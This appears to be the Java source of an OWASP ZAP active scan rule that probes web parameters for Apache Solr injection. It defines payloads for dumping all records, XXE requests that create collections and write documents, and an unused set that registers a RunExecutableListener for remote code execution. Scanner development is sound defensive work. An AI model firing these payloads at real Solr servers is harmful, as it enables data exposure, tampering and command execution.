package org.zaproxy.zap.extension.ascanrulesAlpha;

import java.io.IOException;
import java.net.SocketException;
import org.apache.log4j.Logger;
import org.parosproxy.paros.Constant;
import org.parosproxy.paros.core.scanner.AbstractAppParamPlugin;
import org.parosproxy.paros.core.scanner.Alert;
import org.parosproxy.paros.core.scanner.Category;
import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.zap.model.Tech;

public class SolrInjection extends AbstractAppParamPlugin {

	private static final Tech SOLR_TECH = Tech.Db /* TODO Tech.Solr */;
	private static final String MESSAGE_PREFIX = "ascanalpha.solr.";
	private static final String ALL_DATA_ATTACK = "alldata";
	private static final String XXE_ATTACK = "xxe";
	private static final String INJECTED_COLLECTION = "collectioninjected";
	private static final String DEFAULT_COLLECTION = "gettingstarted";
	private static final String INJECTED_LISTENER = "injectedlistener";
	private static final String TOKEN_UNKOWN_HOST = "http://_z<>a<>p<>.com	";
	private static final String[] ALL_DATA_INJECTION = {"{! rows=10} *", "*", "[* TO *]", "(1 OR *)"};

	private static final String[] XXE_INJECTION = { 
		"{!xmlparser v=\'<!DOCTYPE a SYSTEM \""+TOKEN_UNKOWN_HOST+"\"><a></a>\'}",
		//create a new collection
		"{!xmlparser v='<!DOCTYPE a SYSTEM \"http://localhost:8983/solr/admin/collections?action=CREATE&name="+
		INJECTED_COLLECTION+"&numShards=2\"><a></a>'}",
		"{!xmlparser v='<!DOCTYPE a SYSTEM \"http://localhost:8983/solr/"+DEFAULT_COLLECTION+"/update?stream.body="
		+ "[{\"id\":\"AAA\"}]&commit=true&overwrite=true\"><a></a>'}"		
	};
	
	 static final String[] CODE_EXECUTION_INJECTION = {
		"{!xmlparser v='<!DOCTYPE a SYSTEM \"http://localhost:8983/solr/"+INJECTED_COLLECTION+"/select?q=xxx&qt=/solr/"
		+INJECTED_COLLECTION+"/config?stream.body={\"add-listener\":{\"event\":\"postCommit\",\"name\":\""
		+INJECTED_LISTENER+"\",\"class\":\"solr.RunExecutableListener\"}}&shards=localhost:8983/\"><a></a>'}",
		
		"{!xmlparser v='<!DOCTYPE a SYSTEM \"http://localhost:8983/solr/"+DEFAULT_COLLECTION+"/select?q=xxx&qt=/solr/"
		+DEFAULT_COLLECTION+"/config?stream.body={\"add-listener\":{\"event\":\"postCommit\",\"name\":\""
		+INJECTED_LISTENER+"\",\"class\":\"solr.RunExecutableListener\",\"exe\":\"\"}}&shards=localhost:8983/\"><a>"
		+ "</a>'}"
	};
	
	private static final String[] XXE_ERROR_STRING = {
		"document type declaration must be well-formed",
		"Error parsing XML stream:java.net.UnknownHostException", 
		"Error parsing XML stream:java.net.ConnectException: Connection refused"
	};

	private static final Logger LOG = Logger.getLogger(SolrInjection.class);

	@Override
	public int getId() {
		return 40034;
	}
	
	@Override
	public int getCweId() {
		return 943;
	}

	@Override
	public int getWascId() {
		return 19;
	}
	
	@Override
	public String getName() {
		return Constant.messages.getString(MESSAGE_PREFIX + "name");
	}

	@Override
	public String getDescription() {
		return Constant.messages.getString(MESSAGE_PREFIX + "desc");
	}

	@Override
	public int getCategory() {
		return Category.INJECTION;
	}

	@Override
	public String getSolution() {
		return Constant.messages.getString(MESSAGE_PREFIX + "soln");
	}

	@Override
	public String getReference() {
		return Constant.messages.getString(MESSAGE_PREFIX + "refs");
	}
	
	@Override
	public String[] getDependency() {
		return new String[] {};
	}
	
	public String getExtraInfo(String attack) {
		return Constant.messages.getString(MESSAGE_PREFIX + "extrainfo." + attack);
	}

	@Override
	public void scan(HttpMessage msg, String param, String value) {
		if(inScope(SOLR_TECH)){
			allDataInjectionScan(msg, param, value);
			xxeInjectionScan(msg, param, value);
		}
	}
	
	private void allDataInjectionScan(HttpMessage msg, String param, String value){
		HttpMessage injectedMsg;
		for(String injectedValue : ALL_DATA_INJECTION) {
			if(isStop()) {
				return;
			}
			try {
				injectedMsg = sendInjectedMsg(param, injectedValue);

				if(!getBaseMsg().getResponseBody().toString().equals(injectedMsg.getResponseBody().toString())) {
					bingo(Alert.RISK_MEDIUM, Alert.CONFIDENCE_MEDIUM, getName(), getDescription(), null, param, 
							injectedValue, getExtraInfo(ALL_DATA_ATTACK), getSolution(), injectedMsg);
				return;
				}
			} catch (IOException ex) {
				if (LOG.isDebugEnabled()) {
					LOG.debug("Caught " + ex.getClass().getName() + " " + ex.getMessage() + 
							" when try to send an http message");
				}
			}
		}
	}

	private void xxeInjectionScan(HttpMessage msg, String param, String value) {
		HttpMessage injectedMsg;
		for(String injectedValue : XXE_INJECTION) {
			if(isStop()) {
				return;
			}
			try {
				injectedMsg = sendInjectedMsg(param, injectedValue);
				String bodyMsgInjected = injectedMsg.getResponseBody().toString();
				if(!getBaseMsg().getResponseBody().toString().equals(bodyMsgInjected)) {
					for(String m:XXE_ERROR_STRING) {
						if(bodyMsgInjected.contains(m)) {
							bingo(Alert.RISK_HIGH, Alert.CONFIDENCE_HIGH, getName(), getDescription(), null, param, 
									injectedValue, getExtraInfo(XXE_ATTACK), getSolution(), injectedMsg);
							return;
						}
					}
				}
			} catch (SocketException ex) {
				if (LOG.isDebugEnabled()) {
					LOG.debug("Caught " + ex.getClass().getName() + " " + ex.getMessage() +
							" when try to send an http message");
				}
			} catch (IOException ex) {
				if (LOG.isDebugEnabled()) {
					LOG.debug("Caught " + ex.getClass().getName() + " " + ex.getMessage() + 
							" when try to send an http message");
				}
			}
		}
	}

	private HttpMessage sendInjectedMsg(String param, String value) throws IOException {
		HttpMessage newMsg = getNewMsg();
		setParameter(newMsg, param, value);
		sendAndReceive(newMsg);
		return newMsg;
	}
}